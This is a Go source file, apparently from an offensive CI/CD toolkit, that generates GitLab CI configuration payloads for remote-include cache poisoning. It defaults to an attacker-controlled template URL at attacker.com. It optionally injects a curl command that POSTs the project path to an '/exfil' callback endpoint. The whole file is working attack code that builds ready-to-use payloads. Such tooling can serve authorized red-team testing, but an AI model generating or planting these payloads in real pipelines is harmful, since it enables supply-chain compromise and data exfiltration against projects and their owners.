package payloads

import (
	"fmt"
	"strings"
)

// RemoteIncludeCacheOptions configures a remote include cache poisoning payload.
type RemoteIncludeCacheOptions struct {
	Common       CommonOptions
	RemoteURL    string // attacker-controlled URL
	CacheTTL     string // cache duration (default: "1h")
	PoisonedYAML string // malicious YAML content served at URL
	CallbackURL  string
}

// GenerateRemoteIncludeCacheYAML generates a CI config that includes a remote
// URL with cache enabled (GitLab 19.0+), allowing persistent cache poisoning.
func GenerateRemoteIncludeCacheYAML(o RemoteIncludeCacheOptions) string {
	name, stage := o.Common.defaults("cache-seed")
	if o.RemoteURL == "" {
		o.RemoteURL = "https://attacker.com/ci-template.yml"
	}
	if o.CacheTTL == "" {
		o.CacheTTL = "1h"
	}

	var b strings.Builder

	fmt.Fprintf(&b, `include:
  - remote: %s
    cache: "%s"

stages: [%s]

%s:
  stage: %s%s%s
  script:
    - echo "Pipeline running with cached remote include"
`, o.RemoteURL, o.CacheTTL, stage, name, stage,
		imageLine(o.Common.Image), tagsLine(o.Common.Tags))

	if strings.TrimSpace(o.CallbackURL) != "" {
		fmt.Fprintf(&b, `    - |
%s
`, indentBlock(strings.TrimSpace(fmt.Sprintf(
			`curl -sS -X POST -F "project=$CI_PROJECT_PATH" "%s/exfil" || true`,
			o.CallbackURL)), 6))
	}

	fmt.Fprintf(&b, "  allow_failure: true%s\n", rulesManual(o.Common.Manual))

	return b.String()
}
